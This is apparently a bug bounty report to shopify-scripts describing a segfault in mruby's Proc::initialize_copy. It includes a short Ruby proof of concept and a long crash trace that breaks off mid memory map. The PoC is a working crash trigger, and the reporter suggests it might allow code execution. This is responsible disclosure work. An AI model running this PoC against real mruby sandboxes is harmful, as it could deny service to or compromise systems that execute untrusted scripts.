{
  "reported_to": "shopify-scripts",
  "reported_by": "brakhane ",
  "title": "Crash: calling Proc::initialize_copy with a Proc instance where initialize never ran leads to a crash",
  "content": "\nUsing the same trick from #184661 with Proc leads to another crash, this time in Proc related functions.\nAgain, haven't looked into it besides validity testing and an initial code lookup (more detailed investigation + possible patches when there's more time on my side). Again, to give you guys the possibility to get this fixed ASAP without being limited by the time I got to spare.\nImpact\nI didn't look too close but as it's accessing a 0+OFFSET this might be usable to gain code execution. Otherwise it's just a DoS, further investigation is needed.\nPoC\nThe PoC below crashes the https://www.mruby.science/runs sandbox, mruby master tip and mruby-engine reliably.\nCode 92 Bytes\n1a = Proc.new do\n2end\n3\n4class Proc\n5  def initialize\n6  end\n7end\n8\n9b = Proc.new\n10a.initialize_copy b\nTraces\nmruby-sandbox output:\nCode 34.15 KiB\n1$ bin/sandbox crashes/proc_crash.mrb\n2bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000068\n3ruby 2.3.3p222 (2016-11-21 revision 56859) [x86_64-linux]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:002398 EVAL   bin/sandbox:20 [FINISH]\n8c:0001 p:0000 s:0002 E:001090 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:20:in `<main>'\n12bin/sandbox:20:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007fdcc38ec605 RBP: 0x00007fdcc24524e0 RSP: 0x00007fdcc2450aa8\n16 RAX: 0x0000000000000000 RBX: 0x00007fdcc245a520 RCX: 0x0000000000000000\n17 RDX: 0x0000000000000000 RDI: 0x00007fdcc245a520 RSI: 0x00007fdcc245a490\n18  R8: 0x00007fdcc2460560  R9: 0x0000000000000001 R10: 0x0000000000000000\n19 R11: 0x0000000000000000 R12: 0x00007fdcc245a520 R13: 0x000000000000004d\n20 R14: 0x00007fdcc24524e0 R15: 0x00007fdcc245cb60 EFL: 0x0000000000010246\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/libruby.so.2.3 [0x7fdcc79aa455]\n24/usr/lib/libruby.so.2.3 [0x7fdcc79aa68c]\n25/usr/lib/libruby.so.2.3 [0x7fdcc7884e34]\n26/usr/lib/libruby.so.2.3 [0x7fdcc79366ce]\n27/usr/lib/libc.so.6 [0x7fdcc74aa0b0]\n28/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_copy+0x25) [0x7fdcc38ec605] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:143\n29/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_init_copy+0x7e) [0x7fdcc38ec7be] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175\n30/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7fdcc38dae4f] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n31/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7fdcc38e0697] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n32/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7fdcc38c1613] ../../../../ext/mruby_engine/eval_monitored.c:68\n33/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7fdcc7261454]\n34/usr/lib/libc.so.6(clone+0x5f) [0x7fdcc755f7df]\n35\n36-- Other runtime information -----------------------------------------------\n37\n38* Loaded script: bin/sandbox\n39\n40* Loaded features:\n41\n42    0 enumerator.so\n43    1 thread.rb\n44    2 rational.so\n45    3 complex.so\n46    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n47    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n48    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb\n49    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb\n50    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb\n51    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb\n52   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb\n53   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb\n54   12 /usr/lib/ruby/2.3.0/rubygems/version.rb\n55   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb\n56   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb\n57   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb\n58   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb\n59   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb\n60   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n61   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb\n62   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb\n63   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb\n64   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n65   23 /usr/lib/ruby/2.3.0/monitor.rb\n66   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n67   25 /usr/lib/ruby/2.3.0/rubygems.rb\n68   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb\n69   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n70   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n71   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n72   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n73   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n74   32 /usr/lib/ruby/2.3.0/delegate.rb\n75   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n76   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n77   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n78   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n79   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n80   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n81   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n82   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n83   41 /usr/lib/ruby/2.3.0/pathname.rb\n84   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb\n85   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb\n86   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n87   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb\n88   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n89   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb\n90   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb\n91   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb\n92   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb\n93   51 /usr/lib/ruby/2.3.0/fileutils.rb\n94   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb\n95   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb\n96   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n97   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n98   56 /usr/lib/ruby/2.3.0/socket.rb\n99   57 /usr/lib/ruby/2.3.0/timeout.rb\n100   58 /usr/lib/ruby/2.3.0/net/protocol.rb\n101   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb\n102   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb\n103   61 /usr/lib/ruby/2.3.0/uri/common.rb\n104   62 /usr/lib/ruby/2.3.0/uri/generic.rb\n105   63 /usr/lib/ruby/2.3.0/uri/ftp.rb\n106   64 /usr/lib/ruby/2.3.0/uri/http.rb\n107   65 /usr/lib/ruby/2.3.0/uri/https.rb\n108   66 /usr/lib/ruby/2.3.0/uri/ldap.rb\n109   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb\n110   68 /usr/lib/ruby/2.3.0/uri/mailto.rb\n111   69 /usr/lib/ruby/2.3.0/uri.rb\n112   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n113   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb\n114   72 /usr/lib/ruby/2.3.0/net/http/header.rb\n115   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n116   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb\n117   75 /usr/lib/ruby/2.3.0/net/http/request.rb\n118   76 /usr/lib/ruby/2.3.0/net/http/requests.rb\n119   77 /usr/lib/ruby/2.3.0/net/http/response.rb\n120   78 /usr/lib/ruby/2.3.0/net/http/responses.rb\n121   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb\n122   80 /usr/lib/ruby/2.3.0/net/http/backward.rb\n123   81 /usr/lib/ruby/2.3.0/net/http.rb\n124   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n125   83 /usr/lib/ruby/2.3.0/date.rb\n126   84 /usr/lib/ruby/2.3.0/time.rb\n127   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb\n128   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb\n129   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb\n130   88 /usr/lib/ruby/2.3.0/rubygems/request.rb\n131   89 /usr/lib/ruby/2.3.0/cgi/core.rb\n132   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n133   91 /usr/lib/ruby/2.3.0/cgi/util.rb\n134   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb\n135   93 /usr/lib/ruby/2.3.0/cgi.rb\n136   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb\n137   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n138   96 /usr/lib/ruby/2.3.0/digest.rb\n139   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n140   98 /usr/lib/ruby/2.3.0/openssl/bn.rb\n141   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb\n142  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb\n143  101 /usr/lib/ruby/2.3.0/openssl/config.rb\n144  102 /usr/lib/ruby/2.3.0/openssl/digest.rb\n145  103 /usr/lib/ruby/2.3.0/openssl/x509.rb\n146  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb\n147  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n148  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb\n149  107 /usr/lib/ruby/2.3.0/openssl.rb\n150  108 /usr/lib/ruby/2.3.0/securerandom.rb\n151  109 /usr/lib/ruby/2.3.0/resolv.rb\n152  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb\n153  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb\n154  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n155  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb\n156  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb\n157  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb\n158  116 /usr/lib/ruby/2.3.0/rubygems/util.rb\n159  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb\n160  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb\n161  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb\n162  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb\n163  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb\n164  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb\n165  123 /usr/lib/ruby/2.3.0/rubygems/source.rb\n166  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb\n167  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb\n168  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb\n169  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb\n170  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb\n171  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb\n172  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb\n173  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb\n174  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb\n175  133 /usr/lib/ruby/2.3.0/tmpdir.rb\n176  134 /usr/lib/ruby/2.3.0/tempfile.rb\n177  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb\n178  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb\n179  137 /usr/lib/ruby/2.3.0/optparse.rb\n180  138 /usr/lib/ruby/2.3.0/rubygems/command.rb\n181  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb\n182  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb\n183  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n184  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb\n185  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb\n186  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb\n187  145 /usr/lib/ruby/2.3.0/rubygems/text.rb\n188  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb\n189  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb\n190  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb\n191  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb\n192  150 /usr/lib/ruby/2.3.0/set.rb\n193  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb\n194  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb\n195  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb\n196  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb\n197  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb\n198  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb\n199  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb\n200  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb\n201  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb\n202  160 /usr/lib/ruby/2.3.0/tsort.rb\n203  161 /usr/lib/ruby/2.3.0/forwardable.rb\n204  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb\n205  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb\n206  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb\n207  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb\n208  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb\n209  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb\n210  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb\n211  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb\n212  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb\n213  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb\n214  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb\n215  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb\n216  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb\n217  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb\n218  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb\n219  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb\n220  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb\n221  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb\n222  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb\n223  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb\n224  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb\n225  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb\n226  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb\n227  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb\n228  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb\n229  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb\n230  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb\n231  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb\n232  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb\n233  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb\n234  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb\n235  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb\n236  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb\n237  195 /usr/lib/ruby/2.3.0/json/version.rb\n238  196 /usr/lib/ruby/2.3.0/ostruct.rb\n239  197 /usr/lib/ruby/2.3.0/json/generic_object.rb\n240  198 /usr/lib/ruby/2.3.0/json/common.rb\n241  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n242  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n243  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n244  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n245  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n246  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n247  205 /usr/lib/ruby/2.3.0/json/ext.rb\n248  206 /usr/lib/ruby/2.3.0/json.rb\n249  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n250  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb\n251\n252* Process memory map:\n253\n25400400000-00401000 r-xp 00000000 08:03 948907                             /usr/bin/ruby\n25500600000-00601000 r--p 00000000 08:03 948907                             /usr/bin/ruby\n25600601000-00602000 rw-p 00001000 08:03 948907                             /usr/bin/ruby\n25701d8c000-02ea2000 rw-p 00000000 00:00 0                                  [heap]\n2587fdcbc000000-7fdcbc021000 rw-p 00000000 00:00 0 \n2597fdcbc021000-7fdcc0000000 ---p 00000000 00:00 0 \n2607fdcc11b5000-7fdcc15e1000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n2617fdcc15e1000-7fdcc17be000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n2627fdcc17be000-7fdcc1a3a000 r--s 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n2637fdcc1a3a000-7fdcc1a50000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2647fdcc1a50000-7fdcc1c4f000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2657fdcc1c4f000-7fdcc1c50000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2667fdcc1c50000-7fdcc1c51000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2677fdcc1c51000-7fdcc1c52000 ---p 00000000 00:00 0 \n2687fdcc1c52000-7fdcc2852000 rw-p 00000000 00:00 0 \n2697fdcc2852000-7fdcc2859000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2707fdcc2859000-7fdcc2a59000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2717fdcc2a59000-7fdcc2a5a000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2727fdcc2a5a000-7fdcc2a5b000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2737fdcc2a5b000-7fdcc2a5c000 r-xp 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2747fdcc2a5c000-7fdcc2c5b000 ---p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2757fdcc2c5b000-7fdcc2c5c000 r--p 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2767fdcc2c5c000-7fdcc2c5d000 rw-p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2777fdcc2c5d000-7fdcc2c5e000 r-xp 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2787fdcc2c5e000-7fdcc2e5d000 ---p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2797fdcc2e5d000-7fdcc2e5e000 r--p 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2807fdcc2e5e000-7fdcc2e5f000 rw-p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2817fdcc2e5f000-7fdcc2e60000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2827fdcc2e60000-7fdcc3060000 ---p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2837fdcc3060000-7fdcc3061000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2847fdcc3061000-7fdcc3062000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2857fdcc3062000-7fdcc3063000 r-xp 00000000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2867fdcc3063000-7fdcc3263000 ---p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2877fdcc3263000-7fdcc3264000 r--p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2887fdcc3264000-7fdcc3265000 rw-p 00002000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2897fdcc3265000-7fdcc326b000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2907fdcc326b000-7fdcc346a000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2917fdcc346a000-7fdcc346b000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2927fdcc346b000-7fdcc346c000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2937fdcc346c000-7fdcc3491000 r-xp 00000000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n2947fdcc3491000-7fdcc3690000 ---p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n2957fdcc3690000-7fdcc3691000 r--p 00024000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n2967fdcc3691000-7fdcc3692000 rw-p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n2977fdcc3692000-7fdcc369d000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n2987fdcc369d000-7fdcc389c000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n2997fdcc389c000-7fdcc389d000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n3007fdcc389d000-7fdcc389e000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n3017fdcc389e000-7fdcc38ac000 rw-p 00000000 00:00 0 \n3027fdcc38ac000-7fdcc398a000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3037fdcc398a000-7fdcc3b89000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3047fdcc3b89000-7fdcc3b8b000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3057fdcc3b8b000-7fdcc3b8d000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3067fdcc3b8d000-7fdcc3b92000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3077fdcc3b92000-7fdcc3d91000 ---p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3087fdcc3d91000-7fdcc3d92000 r--p 00004000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3097fdcc3d92000-7fdcc3d93000 rw-p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3107fdcc3d93000-7fdcc3d94000 r-xp 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3117fdcc3d94000-7fdcc3f93000 ---p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3127fdcc3f93000-7fdcc3f94000 r--p 00000000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3137fdcc3f94000-7fdcc3f95000 rw-p 00001000 08:03 948523                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3147fdcc3f95000-7fdcc3f96000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3157fdcc3f96000-7fdcc4196000 ---p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3167fdcc4196000-7fdcc4197000 r--p 00001000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3177fdcc4197000-7fdcc4198000 rw-p 00002000 08:03 948521                    